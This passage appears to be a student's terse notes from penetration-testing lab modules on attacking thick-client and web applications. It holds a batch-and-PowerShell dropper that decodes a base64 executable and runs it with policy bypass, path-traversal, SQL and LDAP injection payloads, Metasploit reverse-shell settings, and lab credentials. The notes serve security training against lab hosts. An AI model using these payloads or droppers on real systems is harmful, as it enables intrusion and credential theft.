echo AAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4g >> c:\programdata\oracle.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> c:\programdata\oracle.txt

echo $salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; foreach ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(" ",""); [System.IO.File]::WriteAllBytes("c:\programdata\restart-service.exe", [System.Convert]::FromBase64String($salida)) > c:\programdata\monta.ps1
powershell.exe -exec bypass -file c:\programdata\monta.ps1
del c:\programdata\monta.ps1
del c:\programdata\oracle.txt
c:\programdata\restart-service.exe
del c:\programdata\restart-service.exe
```

**MODIFIED BATCH FILE**

```batch
@shift /0
@echo off

echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA > c:\programdata\oracle.txt
echo AAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4g >> c:\programdata\oracle.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> c:\programdata\oracle.txt

echo $salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; foreach ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(" ",""); [System.IO.File]::WriteAllBytes("c:\programdata\restart-service.exe", [System.Convert]::FromBase64String($salida)) > c:\programdata\monta.ps1
```

**POWERSHELL SCRIPT**

```powershell
$salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; foreach ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(" ",""); [System.IO.File]::WriteAllBytes("c:\programdata\restart-service.exe", [System.Convert]::FromBase64String($salida))
```

**TOOLS**

```bash
strings64.exe
de4dot
dnSpy
x64dbg
```

```
xfreerdp /v:10.129.228.115 /u:cybervaca /p:'&aue%C)}6g-d{w' /cert:ignore /f
```

```
xfreerdp /v:10.129.228.115 /u:cybervaca /p:'&aue%C)}6g-d{w' /cert:ignore /dynamic-resolution
```
# Exploiting Web Vulnerabilities in Thick-Client Applications

**HOSTS FILE ENTRY**

```cmd
echo 10.10.10.174    server.fatty.htb >> C:\Windows\System32\drivers\etc\hosts
```

**EXTRACT JAR**

```powershell
ls fatty-client\
```

**SEARCH PORT**

```powershell
ls fatty-client\ -recurse | Select-String "8000" | Select Path, LineNumber | Format-List
```

**BEANS.XML**

```xml
<bean id="connectionContext" class = "htb.fatty.shared.connection.ConnectionContext">
   <constructor-arg index="0" value = "server.fatty.htb"/>
   <constructor-arg index="1" value = "8000"/>
</bean>

<bean id="trustedFatty" class = "htb.fatty.shared.connection.TrustedFatty">
   <property name = "keystorePath" value = "fatty.p12"/>
</bean>

<bean id="secretHolder" class = "htb.fatty.shared.connection.SecretHolder">
   <property name = "secret" value = "clarabibiclarabibiclarabibi"/>
</bean>
```

**REBUILD JAR**

```powershell
cd .\fatty-client
jar -cmf .\META-INF\MANIFEST.MF ..\fatty-client-new.jar *
```

**MANIFEST CLEAN**

```txt
Manifest-Version: 1.0
Archiver-Version: Plexus Archiver
Built-By: root
Sealed: True
Created-By: Apache Maven 3.3.9
Build-Jdk: 1.8.0_232
Main-Class: htb.fatty.client.run.Starter
```

**PATH TRAVERSAL PAYLOAD**

```txt
../../../../../../etc/passwd
```

**MODIFIED CLIENT (TRAVERSAL)**

```java
ClientGuiTest.this.currentFolder = "..";
try {
  response = ClientGuiTest.this.invoker.showFiles("..");
```

**COMPILE JAVA**

```powershell
javac -cp fatty-client-new.jar fatty-client-new.jar.src\htb\fatty\client\gui\ClientGuiTest.java
```

**PREPARE RAW JAR**

```powershell
mkdir raw
cp fatty-client-new.jar raw\fatty-client-new-2.jar
```

**REPLACE CLASS FILES**

```powershell
mv -Force fatty-client-new.jar.src\htb\fatty\client\gui\*.class raw\htb\fatty\client\gui\
```

**BUILD TRAVERSE JAR**

```powershell
cd raw
jar -cmf META-INF\MANIFEST.MF traverse.jar .
```

**FILE DOWNLOAD MODIFICATION**

```java
import java.io.FileOutputStream;

public String open(String foldername, String filename) throws MessageParseException, MessageBuildException, IOException {
    this.action = new ActionMessage(this.sessionID, "open");
    this.action.addArgument(foldername);
    this.action.addArgument(filename);
    sendAndRecv();
    String desktopPath = System.getProperty("user.home") + "\\Desktop\\fatty-server.jar";
    FileOutputStream fos = new FileOutputStream(desktopPath);
    byte[] content = this.response.getContent();
    fos.write(content);
    fos.close();
    return "Successfully saved the file to " + desktopPath;
}
```

**SQL INJECTION TEST**

```txt
qtc'
```

**SQL INJECTION PAYLOAD**

```txt
abc' UNION SELECT 1,'abc','a@b.com','abc','admin
```

**PASSWORD FUNCTION (ORIGINAL)**

```java
public void setPassword(String password) {
    String hashString = this.username + password + "clarabibimakeseverythingsecure";
    MessageDigest digest = MessageDigest.getInstance("SHA-256");
    byte[] hash = digest.digest(hashString.getBytes(StandardCharsets.UTF_8));
    this.password = DatatypeConverter.printHexBinary(hash);
}
```

**PASSWORD FUNCTION (MODIFIED)**

```java
public void setPassword(String password) {
    this.password = password;
}
```

# ColdFusion - Discovery & Enumeration

**NMAP SCAN**

```bash
nmap -p- -sC -Pn 10.129.54.88 --open
```

**COMMON PORTS**

```bash
80
443
1935
25
8500
5500
```

**TARGET URL**

```bash
http://10.129.247.30:8500
```

**DISCOVERED DIRECTORIES**

```bash
/CFIDE/
/cfdocs/
```

**ADMIN PANEL**

```bash
/CFIDE/administrator/index.cfm
```

**COMMON FILE EXTENSIONS**

```bash
.cfm
.cfc
```

**DEFAULT FILES**

```bash
admin.cfm
CFIDE/administrator/index.cfm
```


# Attacking ColdFusion
# IIS Tilde Enumeration

**NMAP SCAN**

```bash
nmap -p- -sV -sC --open 10.129.57.61
```

**IIS SHORTNAME SCANNER**

```bash
java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/
```

**DISCOVERED SHORT NAMES**

```bash
ASPNET~1
UPLOAD~1
CSASPX~1.CS
CSASPX~1.CS??
TRANSF~1.ASP
```

**WORDLIST GENERATION**

```bash
egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
```

**GOBUSTER ENUMERATION**

```
egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt 
```

```bash
gobuster dir -u http://10.129.57.61/ -w /tmp/list.txt -x .aspx,.asp
```

**DISCOVERED FILE** 

```bash
/transf**.aspx
```

# LDAP Injection

**Enumeration**

```
nmap -p- -sC -sV --open --min-rate=1000 10.129.205.18
```

**LDAP Query Structure (Reference)**

```php
(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))
```

**Injection — Username Wildcard**

```php
$username = "*";
$password = "dummy";
```

**Injection — Password Wildcard**

```php
$username = "dummy";
$password = "*";
```

**Authentication Bypass (Login Fields)**

```
Username: *
Password: *
```

**ldapsearch Syntax**

```
ldapsearch -H ldap://ldap.example.com:389 -D "cn=admin,dc=example,dc=com" -w secret123 -b "ou=people,dc=example,dc=com" "(mail=john.doe@example.com)"
```

**Target**

```
10.129.205.18
```

# Web Mass Assignment Vulnerabilities

---

**SSH Access**

```
ssh root@10.129.205.15
```

```
!x4;EW[ZLwmDx?=w
```

**Source Code Review**

```
cat /opt/asset-manager/app.py
```

**Burp Suite Intercept — Registration Request**

```
POST /register
```

```
username=new&password=test&confirmed=test
```

**Login Credentials (After Exploit)**

```
username: new
password: test
```

**Vulnerable Code Reference**

```python
for i,j,k in cur.execute('select * from users where username=? and password=?',(username,password)):
  if k:
    session['user']=i
    return redirect("/home",code=302)
  else:
    return render_template('login.html',value='Account is pending for approval')
```

```python
try:
  if request.form['confirmed']:
    cond=True
except:
      cond=False
with sqlite3.connect("database.db") as con:
  cur = con.cursor()
  cur.execute('select * from users where username=?',(username,))
  if cur.fetchone():
    return render_template('index.html',value='User exists!!')
  else:
    cur.execute('insert into users values(?,?,?)',(username,password,cond))
    con.commit()
    return render_template('index.html',value='Success!!')
```

**Ruby on Rails Vulnerable Model (Reference)**

```ruby
class User < ActiveRecord::Base
  attr_accessible :username, :email
end
```

**Attacker-Injected Parameters (Reference)**

```javascript
{ "user" => { "username" => "hacker", "email" => "hacker@example.com", "admin" => true } }
```

**Tools**

```
Burp Suite
```




# Attacking Applications Connecting to Services

---

**SSH Access**

```
ssh htb-student@10.129.205.20
```

```
HTB_@cademy_stdnt!
```

**Run Binary**

```
./octopus_checker
```

**GDB Load Binary**

```
gdb ./octopus_checker
```

**GDB — Set Disassembly Flavor**

```
set disassembly-flavor intel
```

**GDB — Disassemble Main**

```
disas main
```

**GDB — Set Breakpoint at SQLDriverConnect**

```
b *0x5555555551b0
```

**GDB — Run Program**

```
run
```

**Connection String (Extracted from RDX Register)**

```
DRIVER={ODBC Driver 17 for SQL Server};SERVER=localhost, 1401;UID=username;PWD=password;
```

**DLL Metadata Inspection**

```
Get-FileMetaData .\MultimasterAPI.dll
```

**Tools**

```
gdb
PEDA
dnSpy
```

**DLL Target File**

```
MultimasterAPI.dll
```

**DLL Inspection Path**

```
MultimasterAPI.Controllers -> ColleagueController
```

---

---



# Other Notable Applications 
---

**Target**

```
10.129.201.102
```

**Enumeration**

```
nmap -p- -sC -sV --open --min-rate=1000 10.129.201.90
```

**Default Credentials to Try**

```
system:manager
```

```
nagiosadmin:PASSW0RD
```

**Axis2 — AAR Webshell Upload**

```
Metasploit
```

**Websphere — WAR Deployment**

```
WAR
```

**vCenter — Privilege Escalation (Windows)**

```
JuicyPotato
```

**Flag Location**

```
C:\Users\Administrator\Desktop\flag.txt
```

```
exploit(multi/http/weblogic_admin_handle_rce) > set payload windows/x64/meterpreter_reverse_tcp
```

# Application Hardening

**Inventory / Discovery Tools**

```
nmap
EyeWitness
```

**Joomla — Secret Key Login URL Pattern**

```
http://joomla.inlanefreight.local/administrator?thisismysecretkey
```

**Jenkins — Authorization Plugin**

```
Matrix Authorization Strategy
```

**WordPress — Security Plugin**

```
WordFence
```

---

---


# SA I

set ForceExploit true
msf exploit(windows/http/tomcat_cgi_cmdlineargs) > run

meterpreter > cat C:/Users/Administrator/Desktop/flag.txt
f55763d31a8f63ec935abd07aee5d3d0



# SA II

ffuf -c \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \
-u http://10.129.201.90/ \
-H "Host: FUZZ.inlanefreight.local" 


from readme 

monitoring.inlanefreight.local


```
find / -path /proc -prune  -o -type f -name *flag*.txt 2>/dev/null
```

# SA III
xfreerdp /v:10.129.95.200 /u:Administrator /p:'xcyj8izxNVzhf4z' /cert:ignore /dynamic-resolution
![[Pasted image 20260420003658.png]]